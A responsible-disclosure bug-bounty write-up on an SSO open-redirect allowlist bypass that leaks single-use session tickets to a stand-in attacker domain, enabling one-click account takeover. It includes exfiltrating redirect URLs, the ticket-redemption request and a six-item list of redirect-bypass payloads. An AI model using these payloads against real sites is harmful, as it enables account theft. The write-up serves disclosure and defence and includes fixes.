---
title:       "It was not an open redirect: it was the victim's session walking out the door"
summary:     "An SSO `host` parameter accepted foreign domains if you stuck a slash in the right place. What went to the attacker's domain was not the user — it was their session ticket. One click and the account changes hands."
date:        2026-11-11 20:10:00 +0100
lang:        en
ref:         open-redirect-sso-ticket
permalink:   /en/writeups/open-redirect-sso-session-ticket/

severity:    high
cvss:        "8.1"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
cwe:         "CWE-601 · CWE-287"
vuln_class:  "Authentication"
target_type: "Web SSO"
platform:    "YesWeHack"
status:      "Fixed"
tags:        [open-redirect, sso, ato, session, cookies, allowlist-bypass]

takeaways:
  - "An open redirect on its own is worth little. An open redirect that carries a credential in the URL is worth an account."
  - "Comparing domains as text is the mistake: `attacker.com/.brand.com` **contains** `.brand.com` and has nothing to do with it."
  - "Before celebrating, check the parameter really is validated: if an invalid value is rejected and yours gets through, you found a bypass, not an open field."
  - "The ticket must be bound to the destination that requested it. If it works anywhere, anywhere can spend it."
---

Of everything I have published, this is the one that changed how I look at things the most.
It started out looking like the most boring bug in the catalogue — an open redirect, the
kind many programs do not even accept — and ended up being **a one-click account takeover**.

<div class="warn" markdown="1">
**Everything is anonymised.** Published with the program's permission and without
identifying the product: company, domains, cookie names and parameter names have been
changed. The mechanism and the chain are exact.
</div>

## The starting point

A **single sign-on** system: that vendor page you go through to get into any of their
services. You type the password once, the SSO sends you back to the application that asked
for it, and that application gives you a session.

To know where to send you back, the SSO accepts a URL parameter:

```
https://sso.example.tld/doLogin?host=app.example.tld
```

<div class="plain" markdown="1">
**In plain words:** `host` is the "where do I send you when you are done?". It is a
parameter that travels in the link, so it is written by whoever makes the link. And whoever
makes the link can be anyone.
</div>

## First attempt: rejected — and that is good news

The first thing everyone tries is their own domain:

```
https://sso.example.tld/doLogin?host=attacker-example.com
```

Response: **rejected**, with an internal error code. The server does not swallow just
anything.

<div class="plain" markdown="1">
**In plain words:** this is where a lot of people close the tab and leave. I do the
opposite: a **rejection** means there is a control, and a control is something you can
**study**. If it had accepted my domain straight away, it would be a trivial bug. The
rejection turns the question into a much better one: *what exact rule is it applying?*
</div>

And that question is the one that pays.

## How you break an allowlist that compares text

The most common way to validate a domain — and the most broken — is to ask *"does the text
end in `.brand.com`?"* or, worse, *"does it contain it?"*.

It sounds reasonable. It fails for a subtle reason: **a URL is not a string, it is a
structure**, and the browser splits it at places a text comparison ignores.

Look at these three and think about which server is the destination:

| URL | Where the browser goes |
|---|---|
| `https://app.brand.com/` | to `app.brand.com` ✅ |
| `https://attacker.com/.brand.com` | to **`attacker.com`** ⚠ |
| `https://attacker.com%2F.brand.com` | to **`attacker.com`** ⚠ |

<div class="plain" markdown="1">
**In plain words:** the browser decides the destination using whatever comes **before the
first slash**. Everything after that is the path, the "inside" of that site. So
`attacker.com/.brand.com` is a page called `.brand.com` on the attacker's server.

But if the server only checks whether the text *contains* `.brand.com`… it contains it. It
passes the check. And it sends you to the attacker's house.
</div>

The `%2F` in the third example is a slash written in URL encoding. It is useful for
sneaking one past places where a plain slash would be rejected before the check runs.

That was the key:

```
https://sso.example.tld/doLogin?host=attacker-example.com%2F.brand-example.com
```

Accepted. Redirect to the attacker's domain.

## And this is where it stops being an open redirect

A plain open redirect is small change: you send someone to a site they did not expect. It
is useful for phishing, and many programs do not even pay for it.

What turns this into something else is **what the redirect carries with it**.

On completing the hop, the SSO appended a **session ticket** to the URL: a single-use
string that the legitimate application redeems to obtain the user's cookies. And that
ticket went, whole, to the attacker's domain:

```
https://attacker-example.com/.brand-example.com?ticket=a1b2c3d4e5f6...
```

<div class="plain" markdown="1">
**In plain words:** imagine the building's doorman, instead of walking you to your flat,
hands **the key** to whoever quotes an address that looks like yours. It is not that he
sent you to the wrong place: he gave away the key on the way.

And since the attacker owns that server, they read the ticket in their own access log. They
do not even need the victim to do anything else.
</div>

## The one-click case

There is a detail that makes this much worse. If the victim **already has an open session**
— the normal case, because people do not log out — no login screen appears at all. The SSO
sees the cookies, accepts the identity and issues the ticket **straight away**.

The victim makes **one click** on a link whose visible domain is the real vendor's. They
type no password. They see nothing odd. And the ticket is already in the attacker's hands.

## Redeeming the ticket

From a completely clean session — no cookies at all, no password, another browser, another
machine — the attacker presents the stolen ticket at the normal authentication endpoint:

```http
GET /auth?ticket=a1b2c3d4e5f6... HTTP/2
Host: api.example.tld
```

```http
HTTP/2 200 OK
set-cookie: SESSION_ID=...;  USER_ID=...;  USERNAME=...
```

The server hands over **the victim's session cookies**. The ticket alone produced the
session.

{% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/01-ticket-canjeado.png' | relative_url }}"
       alt="Request with no cookies presenting the stolen ticket, and a response setting the victim's session cookies">
  <figcaption>No cookies, no password. The ticket is enough.</figcaption>
</figure>
{% endcomment %}

## Proving impact without overreaching

Holding a cookie proves nothing on its own. You have to show **what it opens**. I used that
session for a single read, the user's own profile:

```http
GET /v3/users/info HTTP/2
Host: api.example.tld
sessionId: <the victim's>
```

It returned their personal data **in clear text**, including the full email address — while
the application's own interface shows it masked.

<div class="plain" markdown="1">
**In plain words:** the app shows you `j***@gmail.com` because it considers the email
sensitive. The API returns it whole. That difference is the proof that what I am holding is
not "some session": it is **that person's identity**.
</div>

And I stopped there. No devices touched, nothing modified, nothing accessed beyond the test
account.

## The negative control

Three counter-tests, and the first is the one that really matters:

| What I tried | What happened | What it rules out |
|---|---|---|
| The same domain **without** the slash: `host=attacker-example.com` | **Rejected** | That the parameter was wide open: there is a real control and I am bypassing it |
| Same endpoint with a **fabricated** session id | `401` | That the API answered anyone |
| Same endpoint with **no** session id | `401` | That this data was public |

<div class="plain" markdown="1">
**In plain words:** the first row is the jewel of the report. It proves the server
**validates** that parameter, and that the only thing standing between a rejection and a
stolen session is **one slash**. That turns "I put my domain in and it worked" into "I found
how to bypass your control". Two very different reports to whoever triages them.
</div>

## A bonus: the cookie that cancelled the protection

Looking at the cookies set when the ticket is redeemed, I saw that one of them carried
**the same session id in clear** and, unlike the main one, **without the `HttpOnly` flag**.

<div class="plain" markdown="1">
**In plain words:** `HttpOnly` is a flag telling the browser *"do not show this value to
JavaScript"*. It exists so that an XSS bug cannot steal the session.

But if the **same** identifier also travels in a second cookie without that flag, the
protection on the first one is worth nothing: any script reads it from the other. It is
locking a door and leaving the window next to it open.
</div>

## Impact

<div class="impact" markdown="1">
**Impact.** Full account takeover from **a single click** by the victim, on a link whose
visible domain is the vendor's legitimate one. The attacker obtains the complete session:
unmasked personal data, email, user id and access to whatever else that session reaches. No
password, no second factor, and nothing for the victim to fill in.
</div>

## The fix

1. **Stop comparing `host` as text.** Parse it as a URL, extract the registrable domain and
   compare it **exactly** against an allowlist. Reject outright any value containing `/`,
   `?`, `#`, `\`, `@` or user information.
2. **Bind the ticket to the destination that asked for it.** A ticket minted for one origin
   should not be redeemable from another. Then, even if someone diverts the redirect, the
   ticket is useless to them.
3. **Set `HttpOnly` and `Secure`** on any cookie carrying the session id. Better still,
   stop putting it in a second cookie.

Point 2 is the important one: it is what makes the bug **unexploitable** even if someone
finds another allowlist bypass tomorrow. Fixing only point 1 is playing cat and mouse with
URL parsers, and that is a game you always lose.

## How to look for this yourself

When you see a parameter that decides a destination — `host`, `redirect`, `return`, `next`,
`callback`, `url`, `continue`, `dest` — try **in this order**:

```
1. ?host=attacker.com                      does it accept it outright?
2. ?host=attacker.com/.brand.com           is CONTAINING the domain enough?
3. ?host=attacker.com%2F.brand.com         and with the slash encoded?
4. ?host=//attacker.com                    does it read the double slash as a scheme?
5. ?host=https://brand.com@attacker.com    does it keep what is before the at sign?
6. ?host=brand.com.attacker.com            does it only check the beginning?
```

And then the question that changes everything: **does the redirect carry something with
it?** Look at the final URL and at the `Referer` header. If a token, a ticket, an
authorisation code or anything that smells like a credential travels there, what you are
holding is not an open redirect. It is an account takeover.
